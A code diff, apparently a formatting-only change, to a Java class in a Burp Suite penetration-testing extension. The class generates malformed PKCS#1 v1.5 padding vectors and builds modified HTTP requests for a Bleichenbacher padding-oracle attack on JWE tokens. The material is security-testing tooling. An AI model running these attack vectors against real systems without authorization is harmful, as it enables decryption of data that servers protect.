@@ -39,16 +39,16 @@ import java.security.interfaces.RSAPublicKey;
 import java.util.*;
 import java.util.List;
 
-
 /**
  * Bleichenbacher PKCS1 Attack Info
  * <p>
- * Class holding meta data for the Bleichenbacher RSA PKCS#1 v1.5 attack
- * and for preparing all necessary parameter for the actual attack.
+ * Class holding meta data for the Bleichenbacher RSA PKCS#1 v1.5 attack and for preparing all
+ * necessary parameter for the actual attack.
  * <p>
  * Attack vector generation based on and code (partly) taken from WS-Attacker
+ * 
  * @see <a href="https://github.com/RUB-NDS/WS-Attacker">WS-Attacker</a>
- *
+ * 
  * @author Dennis Detering
  * @version 1.0
  */
@@ -61,7 +61,6 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     private JoseParameter parameter;
     private RSAPublicKey pubKey;
 
-
     // Unique identifier for the attack class
     private static final String id = "bleichenbarcher_pkcs1";
 
@@ -69,8 +68,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     private static final String name = "Bleichenbacher Million Message Attack";
 
     // Attack description
-    private static final String description = "<html>The <em>Bleichenbacher RSA PKCS#1 v1.5</em> attack (aka. Million Message Attack) " +
-            "exploits a vulnerability where the receiving party may be abused as validity oracle of the PKCS#1 v1.5 conformity.</html>";
+    private static final String description = "<html>The <em>Bleichenbacher RSA PKCS#1 v1.5</em> attack (aka. Million Message Attack) "
+            + "exploits a vulnerability where the receiving party may be abused as validity oracle of the PKCS#1 v1.5 conformity.</html>";
 
     // Amount of requests needed
     private int amountRequests = 0;
@@ -90,19 +89,31 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         WRONG_SECOND_BYTE
     }
 
-    // Hashmap of available payloads with a verbose name (including the PayloadType)
-    private static final HashMap<String, PayloadType> payloads = new HashMap<String, PayloadType>() {{
-        put(String.format("No Null Byte (0x%02X)", PayloadType.NO_NULL_BYTE.ordinal()), PayloadType.NO_NULL_BYTE);
-        put(String.format("Null Byte in Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PADDING.ordinal()), PayloadType.NULL_BYTE_IN_PADDING);
-        put(String.format("Null Byte in PKCS Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PKCS_PADDING.ordinal()), PayloadType.NULL_BYTE_IN_PKCS_PADDING);
-        put(String.format("Symmetric Key of Size 8 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_8.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_8);
-        put(String.format("Symmetric Key of Size 16 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_16.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_16);
-        put(String.format("Symmetric Key of Size 24 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_24.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_24);
-        put(String.format("Symmetric Key of Size 32 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_32.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_32);
-        put(String.format("Symmetric Key of Size 40 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_40.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_40);
-        put(String.format("Wrong First Byte (0x%02X)", PayloadType.WRONG_FIRST_BYTE.ordinal()), PayloadType.WRONG_FIRST_BYTE);
-        put(String.format("Wrong Second Byte (0x%02X)", PayloadType.WRONG_SECOND_BYTE.ordinal()), PayloadType.WRONG_SECOND_BYTE);
-    }};
+    // Hashmap of available payloads with a verbose name (including the
+    // PayloadType)
+    private static final HashMap<String, PayloadType> payloads = new HashMap<String, PayloadType>() {
+        {
+            put(String.format("No Null Byte (0x%02X)", PayloadType.NO_NULL_BYTE.ordinal()), PayloadType.NO_NULL_BYTE);
+            put(String.format("Null Byte in Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PADDING.ordinal()),
+                    PayloadType.NULL_BYTE_IN_PADDING);
+            put(String.format("Null Byte in PKCS Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PKCS_PADDING.ordinal()),
+                    PayloadType.NULL_BYTE_IN_PKCS_PADDING);
+            put(String.format("Symmetric Key of Size 8 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_8.ordinal()),
+                    PayloadType.SYMMETRIC_KEY_OF_SIZE_8);
+            put(String.format("Symmetric Key of Size 16 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_16.ordinal()),
+                    PayloadType.SYMMETRIC_KEY_OF_SIZE_16);
+            put(String.format("Symmetric Key of Size 24 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_24.ordinal()),
+                    PayloadType.SYMMETRIC_KEY_OF_SIZE_24);
+            put(String.format("Symmetric Key of Size 32 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_32.ordinal()),
+                    PayloadType.SYMMETRIC_KEY_OF_SIZE_32);
+            put(String.format("Symmetric Key of Size 40 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_40.ordinal()),
+                    PayloadType.SYMMETRIC_KEY_OF_SIZE_40);
+            put(String.format("Wrong First Byte (0x%02X)", PayloadType.WRONG_FIRST_BYTE.ordinal()),
+                    PayloadType.WRONG_FIRST_BYTE);
+            put(String.format("Wrong Second Byte (0x%02X)", PayloadType.WRONG_SECOND_BYTE.ordinal()),
+                    PayloadType.WRONG_SECOND_BYTE);
+        }
+    };
 
     // List of prepared requests with payload info
     private List<BleichenbacherPkcs1AttackRequest> requests = new ArrayList<>();
@@ -115,7 +126,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     @Override
-    public BleichenbacherPkcs1 prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter) throws AttackPreparationFailedException {
+    public BleichenbacherPkcs1 prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse,
+            IRequestInfo requestInfo, JoseParameter parameter) throws AttackPreparationFailedException {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
@@ -132,7 +144,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         int publicKeyFormat = publicKeySelection.getSelectedIndex();
 
         switch (publicKeyFormat) {
-            // JWK (JSON)
+        // JWK (JSON)
             case 1:
                 loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);
 
@@ -142,7 +154,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
                     pubKey = (RSAPublicKey) publicKeys.get(0);
 
                 } catch (Exception e) {
-                    loggerInstance.log(getClass(), "Error on transforming to RSAPublicKey:  " + e.getMessage(), Logger.LogLevel.ERROR);
+                    loggerInstance.log(getClass(), "Error on transforming to RSAPublicKey:  " + e.getMessage(),
+                            Logger.LogLevel.ERROR);
                     throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                 }
 
@@ -172,10 +185,13 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
 
             String newComponentsConcatenated = Decoder.concatComponents(components);
 
-            byte[] tmpRequest = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);
+            byte[] tmpRequest = JoseParameter
+                    .updateRequest(request, this.parameter, helpers, newComponentsConcatenated);
 
-            requests.add(new BleichenbacherPkcs1AttackRequest(tmpRequest, cek.getKey().ordinal(), cek.getValue(), cek.getKey().name()));
-            loggerInstance.log(getClass(), "Generated CEK: " + Decoder.base64UrlEncode(cek.getValue()), Logger.LogLevel.DEBUG);
+            requests.add(new BleichenbacherPkcs1AttackRequest(tmpRequest, cek.getKey().ordinal(), cek.getValue(), cek
+                    .getKey().name()));
+            loggerInstance.log(getClass(), "Generated CEK: " + Decoder.base64UrlEncode(cek.getValue()),
+                    Logger.LogLevel.DEBUG);
         }
 
         this.amountRequests = requests.size();
@@ -249,12 +265,14 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     @Override
-    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload, String signature) throws AttackPreparationFailedException {
+    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload,
+            String signature) throws AttackPreparationFailedException {
         return new HashMap<>();
     }
 
     /**
      * Get the public key
+     * 
      * @return {@link RSAPublicKey} public key
      */
     public RSAPublicKey getPublicKey() {
@@ -263,18 +281,20 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
 
     /**
      * Get the parameter with the JOSE value
+     * 
      * @return {@link IParameter} parameter
      */
     public JoseParameter getParameter() {
         return this.parameter;
     }
 
-
     /**
      * Generate different encrypted PKCS1 vectors
-     *
-     * @param publicKey Public key
-     * @param keySize Key size
+     * 
+     * @param publicKey
+     *            Public key
+     * @param keySize
+     *            Key size
      * @return Hashmap of encrypted padded keys and according payload type
      */
     private HashMap<PayloadType, byte[]> generatePkcs1Vectors(RSAPublicKey publicKey, int keySize) {
@@ -294,18 +314,27 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
 
             // create plain padded key and encrypt them
             encryptedKeys.put(PayloadType.NO_NULL_BYTE, rsa.doFinal(getEK_NoNullByte(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PADDING, rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PKCS_PADDING, rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_16, rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_24, rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_32, rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_40, rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_8, rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PADDING,
+                    rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PKCS_PADDING,
+                    rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_16,
+                    rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_24,
+                    rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_32,
+                    rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_40,
+                    rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_8,
+                    rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
             encryptedKeys.put(PayloadType.WRONG_FIRST_BYTE, rsa.doFinal(getEK_WrongFirstByte(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(PayloadType.WRONG_SECOND_BYTE, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
+            encryptedKeys
+                    .put(PayloadType.WRONG_SECOND_BYTE, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
             encryptedKeys.put(PayloadType.ORIGINAL, rsa.doFinal(getPaddedKey(rsaKeyLength, keyBytes)));
 
-        } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
+        } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException
+                | NoSuchPaddingException e) {
             loggerInstance.log(getClass(), "Error during key encryption: " + e.getMessage(), Logger.LogLevel.ERROR);
         }
 
@@ -314,9 +343,11 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
 
     /**
      * Generate a validly padded message
-     *
-     * @param rsaKeyLength rsa key length in bytes
-     * @param symmetricKey symmetric key in bytes
+     * 
+     * @param rsaKeyLength
+     *            rsa key length in bytes
+     * @param symmetricKey
+     *            symmetric key in bytes
      * @return The padded key
      */
     private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey) {
@@ -343,42 +374,48 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
                 key[i] = 0x01;
             }
         }
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with no separating byte.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with no separating byte.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_WrongFirstByte(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[0] = 23;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong first byte.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong first byte.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_WrongSecondByte(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[1] = 23;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong second byte.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong second byte.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_NullByteInPkcsPadding(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[3] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in the PKCS1 padding.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class,
+                "Generated a PKCS1 padded message with a 0x00 byte in the PKCS1 padding.", Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_NullByteInPadding(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[11] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in padding.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class,
+                "Generated a PKCS1 padded message with a 0x00 byte in padding.", Logger.LogLevel.DEBUG);
         return key;
     }
 
     private static byte[] getEK_SymmetricKeyOfSize40(int rsaKeyLength, byte[] symmetricKey) {
         byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
         key[rsaKeyLength - 40 - 1] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 40.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 40.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
@@ -391,7 +428,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             }
         }
         key[rsaKeyLength - 32 - 1] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 32.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 32.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
@@ -404,7 +442,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             }
         }
         key[rsaKeyLength - 24 - 1] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 24.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 24.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
@@ -417,7 +456,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             }
         }
         key[rsaKeyLength - 16 - 1] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 16.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 16.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
@@ -430,7 +470,8 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             }
         }
         key[rsaKeyLength - 8 - 1] = 0x00;
-        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 8.", Logger.LogLevel.DEBUG);
+        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 8.",
+                Logger.LogLevel.DEBUG);
         return key;
     }
 
